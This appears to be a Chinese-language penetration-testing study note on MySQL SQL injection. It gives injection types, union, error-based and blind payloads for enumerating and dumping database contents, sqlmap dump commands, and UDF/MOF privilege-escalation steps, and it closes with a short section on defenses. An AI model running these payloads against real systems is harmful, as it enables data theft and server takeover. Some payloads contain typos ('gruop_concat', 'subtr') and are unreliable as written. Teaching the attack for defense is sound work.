## 基于 mysql 数据库的 sql注入



### 漏洞分析



#### 漏洞成因

开发人员在编写代码时未进行严格过滤（或sql语句的使用错误，特殊字符的使用错误），从而引发

将代码拼接到sql语句并执行（本质）



#### 漏洞危害

获取数据库权限（对数据的删除，添加，修改，读取）

为获取权限时，可以进行读取一部分数据（可能会包含敏感信息）



### 漏洞详解

#### 分类

##### 根据请求方式分类

```bash
get注入：在get参数部分 如 ?id=1 id为注入点

post注入：注入点在post数据部分，常发生在表单中

http头注入：注入点在http请求头部的某个字段中，如UA，referer， 
cookie在http请求中也算是头部的一个字段
```



##### 根据注入点类型分类

```bash
数字型：注入点id为数字

字符型：注入点id类型为字符，在进行sql注入时使用的 ’ 作用为闭合前边的单引号。
```



##### 根据执行情况分类

```bash
回显注入:页面会回显sql语句查询的内容

报错注入:页面会返回错误信息，或者将语句查询到的不完全的数据返回到页面
# updataxml()函数，concat()函数
# 语法：updatexml(XML_documen,XPath_string,new_value)，
# 实例：updatexml(1,concat(0x7e,( ),0x7e),1)
### 在updatexml函数中，第一个参数为xml的名称，第二个的参数为代表路径，第三个参数代表更新的数据，使用updatexml函数时，~的ASCII码为0x7e, ~不符合xpath_string的语法格式，concat()函数是字符串连接函数，明显不符合语法规范，从而产生致命的错误将数据输出。PS：也可以用其他字符的ASCII码来代替07xe(~)

盲注:
布尔盲注：无法通过页面的回显获取需要的数据，只会返回真假
时间盲注：无法返回真假，通过观察页面回显的时间长短来判断
# length() 函数 返回字符串长度
# substr() 函数 截取字符串 语法：(substr(string,start,leng)
# ascii() 函数 返回ascii码
# if(ex1,ex2,ex3) 判断语句，如果ex1正确，执行ex2，错误执行ex3
sleep() 设定延时时间
# 执行流程

### 爆破数据库名称的长度 1’ and (length(database()))>5
### 爆破数据库的名称 1’ and ascii(substr(database(),1,1))=100 --+ 通过改变substr()函数中start的数值，测试出库的名称(第一个字母为ASCII码)
### 爆破表名 1’ and (select ascii(substr((select table_name from information_schema.tables where table_schema=’ 库名’ limit 0,1),1,1)))=97 --+
### 爆破列名 1’ and (select ascii(substr((select column_name from information_schema.columns where table_name=’ 表名 ’ limit 0,1),1,1)))=97 --+
### 爆破字段 1‘ and (select ascii(subtr((select 列名 from 表名 limit 0,1),1,1)))=97 --+
###时间盲注的过程与布尔盲注几乎一致，只是需要采用if()函数和sleep()函数，判断页面是否延时
```



##### 其他注入方式

```bash
堆叠注入:将多个sql语句堆叠在一起进行查询，打破了select的限制，可以对其进行增删改查。
在php中存在mysqli_multi_query()函数——执行一个或多个针对数据库的查询，多个查询用分号进行分隔

宽字节注入:利用编码格式的差异，在 ’ 前加入一个字符，使其和 \ 组合误认为汉字，达到让 \ 消失的目的，发挥 ’ 的作用，适用于GBK等编码
# 英文默认占用一个字节，汉字占用两个字节

注释符注入： 注释符常用的有#，–，/* */ 三种
# –通常不能直接使用，一般是使用–+，因为只使用–的时候无法对sql语句进行闭合，需要+或是’来对其进行闭合完成注入语句
# #在URL中会被认为是锚点，使用时需要进行编码，%23
# /**/内联注释是注释指定部分，需要一前一后的闭合，一般用于过滤空格
```



#### sql注入流程

```bash
# 判断是否存在sql注入
假设存在 select password from admin where id =
当我们输入id=1’时，不符合sql语法的规范，会产生报错
而使用and 1=1 and 1 =2 被拦截的可能性太高了，使用and -1=-1 and -1 = -2 观察回显情况
当对参数进行乘法，看页面是否变化
使用sleep函数观察回显的时间

# 使用order by观察回显情况 猜解列数 使用二分法，如果输入错误则报错，存在就维持现状
# 使用union联合查询（将多条查询结果拼接到一个结果中），寻找输出位，
使用语句获取信息
### -1 union select 1, database() 查询当前数据库
### -1 union select 1,group_concat(schema_name) from information_schema.schemata 查询所有数据库
### -1 union select 1,gruop_concat(table_name)from information_schema.tables where table_schema=‘库名’ 查询表名
### -1 union select 1,group_concat(column_table) from information_schema.columns where table_schema=‘库名’ and table_name=‘表名’ 查询列名
### -1 union select 1,group_concat(列名) from 表名 查询字段内容
### PS:limit可以规定返回记录的数目，-1是为了使union前产生一个错误从而执行后边的语句
```



#### sqlmap基础使用

```bash
# python sqlmap.py -u “URL” 判断是否存在注入
# python sqlmap.py -u “URL” --dbs 查询所有的数据库
# python sqlmap.py -u “URL” -current–db 查询当前数据库
# python sqlmap.py -u “URL” -D 库名 --tables 查询指定库的所有表
# python sqlmap.py -u “URL” -D 库名 -T 表名 --columns 查询指定库指定表的所有列名
# python sqlmap.py -u “URL” -D 库名 -T 表名 -C 列名 --dump 爆出该库该表该列的数据
```



### mysql 提权方式

#### UDF提权

UDF 即用户自定义函数，通过添加新的函数，对mysql服务器的功能进行扩充。

函数使用

```bash
# select version();
# select user();
# select @@basedir; 获取数据库安装目录
# show variables like "%plugin%"; 查看plugin路径
### mysql版本大于5.1，udf.dll文件必须放置在mysql安装目录的lib\plugin文件夹下，该目录默认是不存在的，需要使用webshell找到mysql的安装目录，并在安装目录下创建MySQL\Lib\Plugin\文件夹，然后将udf.dll导入到该目录。
### mysql版本小于5.1， udf.dll文件在windows server 2003下放置于c:\windows\system32目录，在windows server 2000下放置在c:\winnt\system32目录。
## 掌握mysql数据库的账户，从拥有对mysql的insert和delete权限，以创建和抛弃函数。拥有可以将udf.dll写入相应目录的权限。
```

导出UDF文件：

````bash
# MySQL<5.0，导出路径随意；
# 5.0 <= MySQL<5.1，则需要导出至目标服务器的系统目录（如：c:/windows/system32/）
# MySQL 5.1以上版本，必须要把udf.dll文件放到MySQL安装目录下的lib\plugin文件夹下才能创建自定义函数。
````

提权流程





#### MOF提权

主要是利用`C:\Windows\System32\wbem\MOF`目录下的 `nullevt.mof`文件

该文件具有每分钟都执行一次的特性，向该文件中写入cmd命令，将会被执行

MOF一般只针对Windows2003以下的操作系统



#### 启动项提权

后续补充



### 漏洞防范

配置waf文件进行防护

使用mysql预编译机制 （预编译：在服务器启动时，mysql client把sql语句模板（变量采用占位符进行占位）发送给mysql服务器，mysql服务器对sql语句的模板进行编译，编译后依据语句对索引进行优化，在最终绑定参数的时候把相应的参数传给mysql服务器，直接执行，防范原理：预编译过程中，mysql服务器对参数进行编译的过程即为填充相应占位符的过程，即转义）

限制数据权限和特权


























